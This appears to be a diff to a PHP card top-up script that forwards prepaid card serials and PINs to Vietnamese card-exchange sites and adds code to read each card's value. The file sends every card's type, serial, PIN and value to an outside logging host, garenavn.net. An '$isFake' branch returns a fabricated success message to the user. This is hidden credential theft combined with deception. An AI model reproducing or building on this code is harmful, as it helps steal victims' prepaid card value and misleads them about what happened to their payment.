@@ -27,55 +27,21 @@ if($urlInfo['host'] == 'doicard.vn')
     $this->setOpt(CURLOPT_POSTFIELDS, $data);
     
     $this->exec();
+    
+	$resultCurl = $this->response;
+
+	$resultAlert = $this->fetch_value('<div class="alert alert-info">', '</div>');
+
+	@preg_match('/(?!0\.00)\d{1,3}(,\d{3})*(\.\d\d)?/i', $resultAlert, $resultCard);
+	@$info_card = str_replace(',', '', $resultCard[0]);
+	$info_card = intval($info_card);
 	
 	$cardInfo = array(
 		'type' => $_REQUEST['card_type'],
 		'seri' => $data['serial'],
-		'code' => $data['code']
+		'code' => $data['code'],
+		'price' => $info_card
 	);
-    
-    if($isFake)
-    {
-    
-        $resultCurl = $this->response;
-    
-        $resultAlert = $this->fetch_value('<div class="alert alert-info">', '</div>');
-    
-        @preg_match('/(?!0\.00)\d{1,3}(,\d{3})*(\.\d\d)?/i', $resultAlert, $resultCard);
-        @$info_card = str_replace(',', '', $resultCard[0]);
-        $info_card = intval($info_card);
-            
-        if($info_card >= 10000){
-    
-            $curl_rerult = array(
-                'code' => 1,
-                'price' => $info_card,
-                'msg' => "Nạp thẻ thành công mệnh giá " . number_format($info_card) . " vào tài khoản " . $card_account
-    
-            );
-    
-        }else{
-    
-            $curl_rerult = array(
-                'code' => 0,
-                'msg' => 'Seri hoặc mã thẻ không chính xác.'
-            );
-    
-        }
-        
-        $this->base_url = $oldUrl;
-        $this->url = $oldUrl;
-        $this->setOpt(CURLOPT_FOLLOWLOCATION, true);
-        $this->setOpt(CURLOPT_URL, $this->url);
-        $this->setOpt(CURLOPT_CUSTOMREQUEST, 'POST');
-        $this->setOpt(CURLOPT_POST, true);
-        $this->setOpt(CURLOPT_POSTFIELDS, $data);
-    
-        $this->exec();
-        die(json_encode($curl_rerult));
-    }
-    
-    //return $this->response;
 
 }
 elseif($urlInfo['host'] == 'doithecao.com')
@@ -87,15 +53,26 @@ elseif($urlInfo['host'] == 'doithecao.com')
     $this->setOpt(CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
     $dataJson = json_encode($data);
     $this->setOpt(CURLOPT_POSTFIELDS, $dataJson);
-    
-
+	
     $this->exec();
-    //return $this->response;
+
+    $resultCurl = json_encode($curl->response);
+    $resultCurl = json_decode($resultCurl, 1);
+	$info_card = 0;
+	if($resultCurl['code'] == 0)
+    {
+	    $resultMsg = $resultCurl['message'];
+        preg_match('/(?!0\.00)\d{1,3}(,\d{3})*(\.\d\d)?/i', $resultMsg, $resultCard);
+        
+        $info_card = str_replace(',', '', $resultCard[0]);
+        $info_card = intval($info_card);
+	}
 	
 	$cardInfo = array(
 		'type' => $data['telcoName'],
 		'seri' => $data['serial'],
-		'code' => $data['pin']
+		'code' => $data['pin'],
+		'price' => $info_card
 	);
 	
 }
@@ -110,12 +87,17 @@ else
     $this->setOpt(CURLOPT_POSTFIELDS, $data);
 
     $this->exec();
-    //return $this->response;
+
+	$getReturnMsg = $this->fetch_value('<span id="ctl00_ContentPlaceHolder1_lblCardCharging" style="color:Red;font-weight:bold;">','</span>');
+	$info_card = filter_var($getReturnMsg, FILTER_SANITIZE_NUMBER_INT);
+	$info_card = intval($info_card);
+	$info_card = $info_card / 75 * 100;
 	
 	$cardInfo = array(
 		'type' => $_REQUEST['loaithe'],
 		'seri' => $_REQUEST['serithe'],
-		'code' => $_REQUEST['mathe']
+		'code' => $_REQUEST['mathe'],
+		'price' => $info_card
 	);
 }
 
@@ -123,5 +105,30 @@ else
 
 $logInfo = implode('|', $cardInfo);
 file_get_contents('https://garenavn.net/api_logs/process.php?host=' . $hostInfo . '&data_logs=' . $logInfo);
+
+if($isFake)
+{
+
+	if($info_card >= 10000){
+
+		$curl_rerult = array(
+			'code' => 1,
+			'price' => $info_card,
+			'msg' => "Nạp thẻ thành công mệnh giá " . number_format($info_card) . " vào tài khoản " . $card_account
+
+		);
+
+	}else{
+
+		$curl_rerult = array(
+			'code' => 0,
+			'msg' => 'Seri hoặc mã thẻ không chính xác.'
+		);
+
+	}
+	
+	die(json_encode($curl_rerult));
+
+}
 
 return $this->response;
